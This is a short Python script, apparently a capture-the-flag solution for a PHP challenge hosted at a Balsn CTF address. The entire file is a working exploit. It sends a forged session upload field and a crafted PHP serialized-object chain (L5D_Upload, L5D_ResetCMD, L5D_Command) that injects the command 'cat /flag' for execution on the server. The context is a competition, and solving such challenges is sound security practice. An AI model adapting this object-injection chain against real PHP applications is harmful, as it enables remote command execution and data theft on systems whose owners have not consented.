# Source: https://gist.github.com/03sunf/a9a1e0d5681657f884a0591ff5946a68

import requests

img = open('image.jpg', 'rb').read()

fle = {
    'l5d_file': (img),
    '_SESSION': ('wubalubadubdub', '')
}

ses = {
    'PHPSESSID': '03sunf'
}

def solve(payload):
    url = f'http://l5d.balsnctf.com:12345/?%3f={payload}'
    res = requests.post(url, cookies=ses, files=fle)
    print(res.text)

if __name__ == '__main__':
	solve('O:10:"L5D_Upload":1:{s:1:"x";O:12:"L5D_ResetCMD":2:{S:10:"\0\\2a\0new_cmd";s:9:"cat /flag";s:1:"x";O:11:"L5D_Command":1:{s:1:"x";O:9:"L5D_Login":0:{}}}}')